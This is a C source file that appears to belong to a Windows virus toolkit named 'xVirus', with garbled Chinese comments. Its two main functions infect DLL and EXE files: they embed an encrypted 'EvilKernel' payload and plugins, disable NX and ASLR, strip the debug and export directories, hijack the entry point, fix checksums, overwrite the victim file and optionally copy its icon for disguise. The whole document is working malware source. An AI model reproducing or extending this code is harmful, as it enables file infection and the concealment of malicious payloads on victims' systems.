#include "Common.h"
#include "Support.h"
#include "EvilPlugin.h"
#include "EvilKernel.h"
#include "xVirusDll.h"
#include "resource.h"

/*
 * ȫ�ֱ���
 */
HMODULE g_hModule = NULL;;
EVILKERNEL_CONFIGURE g_EvilKernelConfigure = {0};
__tchar g_EvilPluginNameArray[__MAX_EVIL_PLUGIN_COUNT__][__EVIL_PLUGIN_NAME_LENGTH__] = {0};
__integer g_iEvilPluginTotalCount = 0;

// ���������ܴ�С
__INLINE__ __integer __INTERNAL_FUNC__ TotalOfEvilPlugins(PEVILKERNEL_CONFIGURE pEvilKernelConfigure) {
	__integer iRet = 0;
	__integer i = 0;
	for (i = 0; i < pEvilKernelConfigure->iPluginTotalCount; i++)
		iRet += pEvilKernelConfigure->PluginSizeArray[i];
	return iRet;
}

/*
 * �������Դ����
 */
#include "..\Common\xVirusCrypto.c"

/*
 * ���ò��
 */
__integer __API__ xVirusInsertPlugin(__tchar *pPluginPath) {
	__char szPluginPath[__EVIL_PLUGIN_NAME_LENGTH__] = {0};
	__integer iPluginPathLength = 0;
	__integer iPluginSize = 0;

	iPluginSize = GetFilePhySize(pPluginPath);//��ȡ����ļ�����
	iPluginPathLength = __logic_tcslen__(pPluginPath);
	__logic_tcscpy__(g_EvilPluginNameArray[g_iEvilPluginTotalCount], pPluginPath);
	g_EvilKernelConfigure.PluginSizeArray[g_iEvilPluginTotalCount] = iPluginSize;
#if defined(__DEBUG_EVIL_PLUGIN__)
	UnicodeToAnsi(pPluginPath, iPluginPathLength, szPluginPath, __EVIL_PLUGIN_NAME_LENGTH__);
	__logic_strcpy__(g_EvilKernelConfigure.PluginNameArray[g_iEvilPluginTotalCount], szPluginPath);
#endif
	g_iEvilPluginTotalCount++;
	g_EvilKernelConfigure.iPluginTotalCount = g_iEvilPluginTotalCount;
	return g_iEvilPluginTotalCount;
}

/*
 * ��x������Ⱦ��DLL��
 */
__bool __API__ xVirusInfect2Dll(__tchar *pTargetPath) {
	__memory pTarget = NULL;
	__integer iTargetSize = 0;
	__memory pManifest = NULL;
	__integer iManifestSize = 0;
	PRESOURCE_INFO pManifestInfo = NULL;
	__memory pTailData = NULL;
	__integer iTailDataSize = 0;
	PIMAGE_NT_HEADERS pTargetNtHdr = NULL;
	__integer iTargetSizeOfImage = 0;
	__word wTargetSubsystem = 0;
	__memory xVirusMap = NULL;
	__integer xVirusMapSize = 0;
	PIMAGE_NT_HEADERS xVirusMapNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilKernelSectionHdr = NULL;
	__memory pEvilKernel = NULL;
	__integer iEvilKernelSize = 0;

	// ӳ��Ŀ�����
	pTarget = (__memory)MappingFile(pTargetPath, &iTargetSize, TRUE, 0, 0);
	if (!pTarget)
		return FALSE;

	pTargetNtHdr = GetNtHeader(pTarget);
	// ��ȡĿ������ӳ���С
	iTargetSizeOfImage = pTargetNtHdr->OptionalHeader.SizeOfImage;

	// ���Ŀ��������manifest���ȡ������Ϣ
	pManifestInfo = GetManifestResourceInfo(pTarget);
	if (pManifestInfo) {
		iManifestSize = pManifestInfo->iPointSize;
		pManifest = (__memory)__logic_new_size__(iManifestSize);
		__logic_memcpy__(pManifest, pManifestInfo->pPoint, iManifestSize);
		__logic_delete__(pManifestInfo);
	}

	// ��ȡĩβ����
	{
		__memory pTailTmp = NULL;
		pTailData = GetTailDataPoint(pTarget, iTargetSize);
		iTailDataSize = GetTailDataSize(pTarget, iTargetSize);
		if (pTailData) {
			pTailTmp = (__memory)__logic_new_size__(iTailDataSize);
			__logic_memcpy__(pTailTmp, pTailData, iTailDataSize);
			pTailData = pTailTmp;
			//iTargetSize -= iTailDataSize;
			//// ����ӳ��Ŀ�����
			//UnMappingFile(pTarget);
			//pTarget = (__memory)MappingFile(pTargetPath, NULL, TRUE, 0, iTargetSize);
			//if (!pTarget) {
			//	if (pManifest) __logic_delete__(pManifest);
			//	__logic_delete__(pTailData);
			//	return FALSE;
			//}/* end if */
		}/* end if */
	}

	// ����Ŀ���ļ��ĳ��ȵ����ýṹ
	g_EvilKernelConfigure.iTargetFileSize = iTargetSize;//��ĩβ���ݳ��ȵĳ���

	// ��Ŀ����򸽼ӵ�а�������
	{
		/*
		 * а������½ڽṹ
		 * ���ýṹ
		 * Ŀ�����
		 * ������
		 */
		PIMAGE_SECTION_HEADER pTargetSectionHdr = NULL;
		__integer iTotalOfEvilPlugins = 0;
		__integer iTargetSectionSize = 0;
		pEvilKernel = MapResourceData(g_hModule, IDR_EVILKERNEL, _T("BIN"), &iEvilKernelSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// �����½ڳ���
		iTotalOfEvilPlugins = TotalOfEvilPlugins(&g_EvilKernelConfigure);
		iTargetSectionSize = sizeof(EVILKERNEL_CONFIGURE) + iTargetSize + iTotalOfEvilPlugins;
		iTargetSectionSize = GetAddSectionMapSize(pEvilKernel, iTargetSectionSize);
		// ����ӳ��а�����
		pEvilKernel = MapResourceDataPlusNewSize(pEvilKernel, iEvilKernelSize, iTargetSectionSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}
		iEvilKernelSize += iTargetSectionSize;
		// ����½�
#define __DEF_EVILKERNEL_TARGET_SECTION_NAME__					".ET"
		pTargetSectionHdr = AddSection(pEvilKernel, __DEF_EVILKERNEL_TARGET_SECTION_NAME__, \
									   __DEF_NEWSECTION_CHARACTERISTICS__, iTargetSectionSize, NULL, FALSE);
		if (!pTargetSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// д������
		{
			__memory pWriteTo = NULL;
			pWriteTo = pEvilKernel + pTargetSectionHdr->PointerToRawData;
			// ��������
			g_EvilKernelConfigure.bIsDll = TRUE;
			__logic_memcpy__(pWriteTo, &g_EvilKernelConfigure, sizeof(EVILKERNEL_CONFIGURE));
			__logic_memcpy__(pWriteTo + sizeof(EVILKERNEL_CONFIGURE), pTarget, iTargetSize);
			pWriteTo += (sizeof(EVILKERNEL_CONFIGURE) + iTargetSize);
			// ѭ��д����
			{
				__integer i = 0;
				__memory pCurrPlugin = NULL;
				__integer iCurrPluginSize = 0;
				__tchar *pPluginName = NULL;
				for (i = 0; i < g_EvilKernelConfigure.iPluginTotalCount; i++) {
					pPluginName = (__tchar *)&(g_EvilPluginNameArray[i]);
					pCurrPlugin = MappingFile(pPluginName, &iCurrPluginSize, FALSE, 0, 0);
					__logic_memcpy__(pWriteTo, pCurrPlugin, iCurrPluginSize);
					pWriteTo += iCurrPluginSize;
					UnMappingFile(pCurrPlugin);
				}
			}
		}
		// �ر�ӳ��Ŀ��
		UnMappingFile(pTarget);
	}

	// ӳ��X����
	xVirusMap = MapResourceData(g_hModule, IDR_XVIRUS_DLL, _T("BIN"), &xVirusMapSize);
	if (!xVirusMap) {
		if (pManifest) __logic_delete__(pManifest);
		if (pTailData) __logic_delete__(pTailData);
		UnMapResourceData(pEvilKernel);
		return FALSE;
	}

	// ��а�������ӵ�X�������½�
	{
		__integer iEvilKernelSectionSize = 0;
		__memory pEvilKernelWriteTo = NULL;
		__dword dwKey = 0;

		// ��ȡ��ĩβ�ڴ�С
		iEvilKernelSectionSize = iEvilKernelSize + iTargetSizeOfImage + iManifestSize;
		iEvilKernelSectionSize = GetAddSectionMapSize(xVirusMap, iEvilKernelSectionSize);

		// ����ӳ��xVirusDll
		xVirusMap = MapResourceDataPlusNewSize(xVirusMap, xVirusMapSize, iEvilKernelSectionSize);
		if (!xVirusMap) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			UnMapResourceData(pEvilKernel);
			return FALSE;
		}
		xVirusMapSize += iEvilKernelSectionSize;//�������ó���

		// ����½�
#define __XVIRUS_DLL_NEW_SECTION_NAME__			".ET"
		pEvilKernelSectionHdr = AddSection(xVirusMap, __XVIRUS_DLL_NEW_SECTION_NAME__, __DEF_NEWSECTION_CHARACTERISTICS__, \
										   iEvilKernelSectionSize, NULL, FALSE);
		if (!pEvilKernelSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			UnMapResourceData(pEvilKernel);
			return FALSE;
		}

		// ��а�����д�뵽ĩβ����
		pEvilKernelWriteTo = xVirusMap + pEvilKernelSectionHdr->PointerToRawData;

		// ������Կ
		dwKey = __XVIRUS_DLL_DECODE_KEY__;
		// ����
		XorArray(dwKey, pEvilKernel, pEvilKernelWriteTo, iEvilKernelSize);

		// �ر�а�����ӳ��
		UnMapResourceData(pEvilKernel);
	}

	// �������manifest�ļ��������趨manifest
	if (iManifestSize) {
		// ��ȡxVirus��manifest
		PRESOURCE_INFO xVirusMapManifestInfo = GetManifestResourceInfo(xVirusMap);
		if (xVirusMapManifestInfo) {
			__offset ofManifestRva = 0;
			__offset ofManifestRaw = 0;
			__memory pManifestNewLocal = NULL;
			/*
			 * �ڴ沼��ͼ
			 * а�����
			 * Manifest
			 */
			ofManifestRaw = pEvilKernelSectionHdr->PointerToRawData + iEvilKernelSize + iTargetSizeOfImage;
			pManifestNewLocal = xVirusMap + ofManifestRaw;
			__logic_memcpy__(pManifestNewLocal, pManifest, iManifestSize);
			ofManifestRva = Raw2Rva(xVirusMap, ofManifestRaw);
			xVirusMapManifestInfo->pDataEntry->OffsetToData = ofManifestRva;
			xVirusMapManifestInfo->pDataEntry->Size = iManifestSize;
		}
		__logic_delete__(pManifest);
		__logic_delete__(xVirusMapManifestInfo);
	}

	// ���»�ȡxVirusDll��NTͷ
	xVirusMapNtHdr = __GetNtHeader__(xVirusMap);

	// ֻȥ������ִ�б�������
	xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	//xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

	// �Ƿ���Ŀ���ļ���ĩβ����
	if (pTailData) {
		xVirusMap = MapResourceDataPlusNewSize(xVirusMap, xVirusMapSize, iTailDataSize);
		if (!xVirusMap) {
			__logic_delete__(xVirusMap);
			return FALSE;
		}
		__logic_memcpy__(xVirusMap + xVirusMapSize, pTailData, iTailDataSize);
		__logic_delete__(pTailData);
		xVirusMapSize += iTailDataSize;
	}

	// �����趨��������У���
	RefixCheckSum(xVirusMap, xVirusMapSize);

	// ���ɱ�������ļ�
	DeleteFile(pTargetPath);
	UnMapResourceDataToFile(pTargetPath, xVirusMap, xVirusMapSize);
	UnMapResourceData(xVirusMap);//ֱ������

	{
		// ����������ڵ�
		__offset ofOrigEntryAddressRva = 0;
		__offset *pofOrigEntryAddressRva = NULL;
		__address *paddrDllStartup = NULL;
		__offset ofDllStartupRva = 0;

		// ӳ��Ŀ�����
		pTarget = (__memory)MappingFile(pTargetPath, &iTargetSize, TRUE, 0, 0);
		if (!pTarget)
			return FALSE;

		pTargetNtHdr = GetNtHeader(pTarget);
		ofOrigEntryAddressRva = pTargetNtHdr->OptionalHeader.AddressOfEntryPoint;

		pofOrigEntryAddressRva = (__offset *)xGetAddressFromOnFile(pTarget, "g_ofOrigEntryAddressRva", NULL);
		if (!pofOrigEntryAddressRva) {
			UnMappingFile(pTarget);
			return FALSE;
		}
		*pofOrigEntryAddressRva = ofOrigEntryAddressRva;//����ԭ��ڵ�

		paddrDllStartup = (__address *)xGetAddressFromOnFile(pTarget, "DllStartup", &ofDllStartupRva);
		if (!paddrDllStartup) {
			UnMappingFile(pTarget);
			return FALSE;
		}
		
		// �޸���ڵ�
		pTargetNtHdr->OptionalHeader.AddressOfEntryPoint = ofDllStartupRva;

		// ɾ��X����DLL�ĵ��Խ�, �����, ������
		DeleteDataDirectoryObject(pTarget, IMAGE_DIRECTORY_ENTRY_EXPORT);
		DeleteDataDirectoryObject(pTarget, IMAGE_DIRECTORY_ENTRY_DEBUG);

		// �ر�ӳ��Ŀ��
		UnMappingFile(pTarget);
	}

	return TRUE;
}

/*
 * ��x������Ⱦ��EXE��
 */
__bool __API__ xVirusInfect2Exe(__tchar *pTargetPath, __tchar *pIconPath) {
	__memory pTarget = NULL;
	__integer iTargetSize = 0;
	__memory pManifest = NULL;
	__integer iManifestSize = 0;
	PRESOURCE_INFO pManifestInfo = NULL;
	__memory pTailData = NULL;
	__integer iTailDataSize = 0;
	PIMAGE_NT_HEADERS pTargetNtHdr = NULL;
	__address addrTargetImageBase = 0;
	__integer iTargetSizeOfImage = 0;
	__word wTargetSubsystem = 0;
	__memory xVirusMap = NULL;
	__integer xVirusMapSize = 0;
	PIMAGE_NT_HEADERS xVirusMapNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilKernelSectionHdr = NULL;
	__memory pEvilKernel = NULL;
	__integer iEvilKernelSize = 0;

	// ӳ��Ŀ�����
	pTarget = (__memory)MappingFile(pTargetPath, &iTargetSize, TRUE, 0, 0);
	if (!pTarget)
		return FALSE;

	pTargetNtHdr = GetNtHeader(pTarget);
	// ��ȡĿ������ӳ���С�����ַ
	addrTargetImageBase = pTargetNtHdr->OptionalHeader.ImageBase;
	iTargetSizeOfImage = pTargetNtHdr->OptionalHeader.SizeOfImage;
	wTargetSubsystem = pTargetNtHdr->OptionalHeader.Subsystem;

	// ���Ŀ��������manifest���ȡ������Ϣ
	pManifestInfo = GetManifestResourceInfo(pTarget);
	if (pManifestInfo) {
		iManifestSize = pManifestInfo->iPointSize;
		pManifest = (__memory)__logic_new_size__(iManifestSize);
		__logic_memcpy__(pManifest, pManifestInfo->pPoint, iManifestSize);
		__logic_delete__(pManifestInfo);
	}

	// ��ȡĩβ����
	{
		__memory pTailTmp = NULL;
		pTailData = GetTailDataPoint(pTarget, iTargetSize);
		iTailDataSize = GetTailDataSize(pTarget, iTargetSize);
		if (pTailData) {
			pTailTmp = (__memory)__logic_new_size__(iTailDataSize);
			__logic_memcpy__(pTailTmp, pTailData, iTailDataSize);
			pTailData = pTailTmp;
			//// ����ӳ��Ŀ�����
			//iTargetSize -= iTailDataSize;
			//UnMappingFile(pTarget);
			//pTarget = (__memory)MappingFile(pTargetPath, NULL, TRUE, 0, iTargetSize);
			//if (!pTarget) {
			//	if (pManifest) __logic_delete__(pManifest);
			//	__logic_delete__(pTailData);
			//	return FALSE;
			//}/* end if */
		}/* end if */
	}

	// ����Ŀ���ļ��ĳ��ȵ����ýṹ
	g_EvilKernelConfigure.iTargetFileSize = iTargetSize;

	// ��Ŀ����򸽼ӵ�а�������
	{
		/*
		 * а������½ڽṹ
		 * ���ýṹ
		 * Ŀ�����
		 * ������
		 */
		PIMAGE_SECTION_HEADER pTargetSectionHdr = NULL;
		__integer iTotalOfEvilPlugins = 0;
		__integer iTargetSectionSize = 0;
		pEvilKernel = MapResourceData(g_hModule, IDR_EVILKERNEL, _T("BIN"), &iEvilKernelSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// �����½ڳ���
		iTotalOfEvilPlugins = TotalOfEvilPlugins(&g_EvilKernelConfigure);
		iTargetSectionSize = sizeof(EVILKERNEL_CONFIGURE) + iTargetSize + iTotalOfEvilPlugins;
		iTargetSectionSize = GetAddSectionMapSize(pEvilKernel, iTargetSectionSize);
		// ����ӳ��а�����
		pEvilKernel = MapResourceDataPlusNewSize(pEvilKernel, iEvilKernelSize, iTargetSectionSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}
		iEvilKernelSize += iTargetSectionSize;
		// ����½�
#define __DEF_EVILKERNEL_TARGET_SECTION_NAME__					".ET"
		pTargetSectionHdr = AddSection(pEvilKernel, __DEF_EVILKERNEL_TARGET_SECTION_NAME__, \
									   __DEF_NEWSECTION_CHARACTERISTICS__, iTargetSectionSize, NULL, FALSE);
		if (!pTargetSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// д������
		{
			__memory pWriteTo = NULL;
			pWriteTo = pEvilKernel + pTargetSectionHdr->PointerToRawData;
			// ��������
			g_EvilKernelConfigure.bIsDll = FALSE;
			__logic_memcpy__(pWriteTo, &g_EvilKernelConfigure, sizeof(EVILKERNEL_CONFIGURE));
			__logic_memcpy__(pWriteTo + sizeof(EVILKERNEL_CONFIGURE), pTarget, iTargetSize);
			pWriteTo += (sizeof(EVILKERNEL_CONFIGURE) + iTargetSize);
			// ѭ��д����
			{
				__integer i = 0;
				__memory pCurrPlugin = NULL;
				__integer iCurrPluginSize = 0;
				__tchar *pPluginName = NULL;
				for (i = 0; i < g_EvilKernelConfigure.iPluginTotalCount; i++) {
					pPluginName = (__tchar *)&(g_EvilPluginNameArray[i]);
					pCurrPlugin = MappingFile(pPluginName, &iCurrPluginSize, FALSE, 0, 0);
					__logic_memcpy__(pWriteTo, pCurrPlugin, iCurrPluginSize);
					pWriteTo += iCurrPluginSize;
					UnMappingFile(pCurrPlugin);
				}
			}
		}
		// �ر�ӳ��Ŀ��
		UnMappingFile(pTarget);
	}

	// ӳ��X����
	xVirusMap = MapResourceData(g_hModule, IDR_XVIRUS, _T("BIN"), &xVirusMapSize);
	if (!xVirusMap) {
		if (pManifest) __logic_delete__(pManifest);
		if (pTailData) __logic_delete__(pTailData);
		UnMapResourceData(pEvilKernel);
		return FALSE;
	}

	// ����X������Ŀ��������ַ
	if (BaseRelocationOnFile(xVirusMap, addrTargetImageBase) == FALSE) {
		if (pManifest) __logic_delete__(pManifest);
		if (pTailData) __logic_delete__(pTailData);
		UnMapResourceData(pEvilKernel);
		return FALSE;
	}

	// ��а�������չ��X������ĩβ��
	{
		__integer iEvilKernelSectionSize = 0;
		__memory pEvilKernelWriteTo = NULL;
		__dword dwKey = 0;

		// ��ȡ��ĩβ�ڴ�С
		iEvilKernelSectionSize = iEvilKernelSize + iTargetSizeOfImage + iManifestSize;

		// ��չ������ĩβ�ڴ�С
		pEvilKernelSectionHdr = CoverTailSectionFromImage(xVirusMap, (__memory *)&xVirusMap, xVirusMapSize, iEvilKernelSectionSize, \
														  NULL, 0, &xVirusMapSize);
		if (!pEvilKernelSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			UnMapResourceData(pEvilKernel);
			return FALSE;
		}

		// ��а�����д�뵽ĩβ����
		pEvilKernelWriteTo = xVirusMap + pEvilKernelSectionHdr->PointerToRawData;

		// ������Կ
		{
			PIMAGE_SECTION_HEADER xVirusCodeSectionHdr = NULL;
			__memory xVirusCode = NULL;
			__integer xVirusSize = 0;

			xVirusCodeSectionHdr = GetEntryPointSection(xVirusMap);
			xVirusCode = xVirusMap + xVirusCodeSectionHdr->PointerToRawData;
			xVirusSize = xVirusCodeSectionHdr->Misc.VirtualSize;
			dwKey = crc32(xVirusCode, xVirusSize);
		}
		// ����
		XorArray(dwKey, pEvilKernel, pEvilKernelWriteTo, iEvilKernelSize);

		// �ر�а�����ӳ��
		UnMapResourceData(pEvilKernel);
	}

	// �������manifest�ļ��������趨manifest
	if (iManifestSize) {
		// ��ȡxVirus��manifest
		PRESOURCE_INFO xVirusMapManifestInfo = GetManifestResourceInfo(xVirusMap);
		if (xVirusMapManifestInfo) {
			__offset ofManifestRva = 0;
			__offset ofManifestRaw = 0;
			__memory pManifestNewLocal = NULL;
			/*
			 * �ڴ沼��ͼ
			 * а�����
			 * Manifest
			 */
			ofManifestRaw = pEvilKernelSectionHdr->PointerToRawData + iEvilKernelSize + iTargetSizeOfImage;
			pManifestNewLocal = xVirusMap + ofManifestRaw;
			__logic_memcpy__(pManifestNewLocal, pManifest, iManifestSize);
			ofManifestRva = Raw2Rva(xVirusMap, ofManifestRaw);
			xVirusMapManifestInfo->pDataEntry->OffsetToData = ofManifestRva;
			xVirusMapManifestInfo->pDataEntry->Size = iManifestSize;
		}
		__logic_delete__(pManifest);
		__logic_delete__(xVirusMapManifestInfo);
	}

	// ������ϵͳ
	xVirusMapNtHdr = GetNtHeader(xVirusMap);
	xVirusMapNtHdr->OptionalHeader.Subsystem = wTargetSubsystem;

	/*
	 * ������������,������xVirus����������ԭ��
	 * ��������ʹ������������
	 */
	// �����ļ�����
	xVirusMapNtHdr->FileHeader.Characteristics = (IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE);

	// ȥ������ִ�б��������������ַ��ӳ�����
	xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

	// ɾ���������ĵ��Խ�, �����, ������
	DeleteDataDirectoryObject(xVirusMap, IMAGE_DIRECTORY_ENTRY_EXPORT);
	DeleteDataDirectoryObject(xVirusMap, IMAGE_DIRECTORY_ENTRY_DEBUG);

	// �Ƿ���Ŀ���ļ���ĩβ����
	if (pTailData) {
		xVirusMap = MapResourceDataPlusNewSize(xVirusMap, xVirusMapSize, iTailDataSize);
		if (!xVirusMap) {
			__logic_delete__(xVirusMap);
			return FALSE;
		}
		__logic_memcpy__(xVirusMap + xVirusMapSize, pTailData, iTailDataSize);
		__logic_delete__(pTailData);
		xVirusMapSize += iTailDataSize;
	}

	// �����趨��������У���
	RefixCheckSum(xVirusMap, xVirusMapSize);

	// ���ɱ�������ļ�
	DeleteFile(pTargetPath);
	UnMapResourceDataToFile(pTargetPath, xVirusMap, xVirusMapSize);
	UnMapResourceData(xVirusMap);//ֱ������

	// �Ƿ��滻ICON
	if (pIconPath)
		ChangedExeIcon(pTargetPath, pIconPath);

	return TRUE;
}

